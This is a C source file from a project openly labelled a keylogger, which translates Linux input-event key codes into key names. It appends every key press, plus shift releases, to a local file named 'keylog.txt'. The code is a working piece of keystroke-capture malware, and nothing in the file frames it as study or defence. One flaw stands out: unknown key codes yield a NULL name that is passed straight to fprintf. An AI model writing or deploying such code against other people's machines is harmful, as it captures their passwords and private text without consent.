#include <linux/input.h>
#include <stddef.h>
#include <stdio.h>
#include "../include/keylogger.h"

#define LOG_FILE "keylog.txt"

KeyCode KEY_CODES[] = {
        {0,  "<RESERVED>"},
        {1,  "<ESC>"},
        {2,  "1"},
        {3,  "2"},
        {4,  "3"},
        {5,  "4"},
        {6,  "5"},
        {7,  "6"},
        {8,  "7"},
        {9,  "8"},
        {10, "9"},
        {11, "0"},
        {12, "-"},
        {13, "="},
        {14, "<BACKSPACE>"},
        {15, "<TAB>"},
        {16, "q"},
        {17, "w"},
        {18, "e"},
        {19, "r"},
        {20, "t"},
        {21, "y"},
        {22, "u"},
        {23, "i"},
        {24, "o"},
        {25, "p"},
        {26, "["},
        {27, "]"},
        {28, "<ENTER>\n"},
        {29, "<LEFTCTRL>"},
        {30, "a"},
        {31, "s"},
        {32, "d"},
        {33, "f"},
        {34, "g"},
        {35, "h"},
        {36, "j"},
        {37, "k"},
        {38, "l"},
        {39, ";"},
        {40, "'"},
        {41, "`"},
        {42, "<LEFTSHIFT>"},
        {43, "\\"},
        {44, "z"},
        {45, "x"},
        {46, "c"},
        {47, "v"},
        {48, "b"},
        {49, "n"},
        {50, "m"},
        {51, ","},
        {52, "."},
        {53, "/"},
        {54, "<RIGHTSHIFT>"},
        {55, "<KPASTERISK>"},
        {56, "<LEFTALT>"},
        {57, " "},
        {58, "<CAPSLOCK>"},
        {59, "<F1>"},
        {60, "<F2>"},
        {61, "<F3>"},
        {62, "<F4>"},
        {63, "<F5>"},
        {64, "<F6>"},
        {65, "<F7>"},
        {66, "<F8>"},
        {67, "<F9>"},
        {68, "<F10>"},
        {69, "<NUMLOCK>"},
        {70, "<SCROLLLOCK>"},
        {71, "<KP7>"},
        {72, "<KP8>"},
        {73, "<KP9>"},
        {74, "<KPMINUS>"},
        {75, "<KP4>"},
        {76, "<KP5>"},
        {77, "<KP6>"},
        {78, "<KPPLUS>"},
        {79, "<KP1>"},
        {80, "<KP2>"},
        {81, "<KP3>"},
        {82, "<KP0>"},
        {83, "<KPDOT>"},

        // Custom keys
        {9000, "<RIGHTUNSHIFT>"},
        {9001, "<LEFTUNSHIFT>"},
};
#define NUM_KEY_CODES (sizeof(KEY_CODES) / sizeof(KeyCode))

const char *decodeKey(int key) {
    const char *keyName = NULL;

    for (int i = 0; i < NUM_KEY_CODES; i++) {
        if (KEY_CODES[i].code == key) {
            keyName = KEY_CODES[i].name;
        }
    }

    return keyName;
}

void logKeyToFile(int key) {
    const char *keyName = decodeKey(key);

    FILE *file = fopen(LOG_FILE, "a");
    if (file == NULL) {
        perror("Failed to open file");
        return;
    }

    fprintf(file, "%s", keyName);

    fclose(file);
}

int logKeyFromInputEventToFile(struct input_event ev) {

    // For an EV_KEY event type, the value is set to 0 for a key release,
    // 1 for a keypress, and 2 for auto-repeat.
    if (ev.type == EV_KEY) {

        if (ev.value == 1) { // Log the keypress
            logKeyToFile(ev.code);
        } else if (ev.value == 0) { // Log the key release

            // Log unshift
            if (ev.code == KEY_RIGHTSHIFT) {
                logKeyToFile(9000);
            } else if (ev.code == KEY_LEFTSHIFT) {
                logKeyToFile(9001);
            }
        }
    }

    // Continue listening for events
    return 1;
}